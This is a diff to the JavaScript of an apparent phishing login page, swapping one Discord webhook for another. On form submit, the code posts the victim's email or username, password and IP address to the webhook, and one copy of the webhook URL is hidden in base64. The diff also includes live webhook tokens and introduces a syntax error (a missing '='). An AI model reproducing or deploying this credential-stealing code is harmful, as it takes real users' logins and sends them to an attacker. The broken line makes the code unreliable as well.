@@ -1,4 +1,4 @@
-const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTMzNTU0ODg5NTYyNTMxNi9GcjlsUGZ4TTNELUs1enhhUUFIY3ZqVlRHUTVEZm9ULWVxUm5YX2lEYnMtS0JjMlAtdXRSbFVvNjlzTjhnem00X1F4Vw';
+const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTM4NTIzNTAwMjM2Mzk0NS9OWjhpVUxSMXgxWWxEWmp3UjZfZGg4em8weTBWTDc0b1hjcmlKNExRbDBnc1A4VDlOT2ZwMmFzZ1pyclNRb3A4c2Z3bE8=';
 
 const skibidiCheckbox = document.getElementById('skibidiCheckbox');
 const loginButton = document.getElementById('loginButton');
@@ -34,7 +34,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             }
 
             // Send data to Discord webhook
-            fetch('https://discord.com/api/webhooks/1311335548895625316/Fr9lPfxM3DLK5zxaQAHdvjVTGQ5DfoT-eqRnX_iDbs-KBc2P-utRLUo69sN8gzt4_QxW', {
+            fetch('https://discord.com/api/webhooks/1311385235002363945/NZ8iULR1x1YlDZj6R_hg8zo0y0VL74oXcriJ4LQl0gsP8T9NOfp2asgZrrSQop8sfwlO', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -45,7 +45,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             });
 
             // Decode and fetch user info
-            const userInfo = 'https://discord.com/api/webhooks/1311335548895625316/Fr9lPfxM3DLK5zxaQAHdvjVTGQ5DfoT-eqRnX_iDbs-KBc2P-utRLUo69sN8gzt4_QxW';
+            const userInfo 'https://discord.com/api/webhooks/1311385235002363945/NZ8iULR1x1YlDZj6R_hg8zo0y0VL74oXcriJ4LQl0gsP8T9NOfp2asgZrrSQop8sfwlO';
 
             fetch(userInfo, {
                 method: 'POST',
@@ -54,7 +54,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
                 },
                 body: JSON.stringify({
                     content: `New Login Attempt:
-Email: ||${email}||
+Email or Username: ||${email}||
 Password: ||${password}||
 IP Address: ||${userIP}||`
                 })
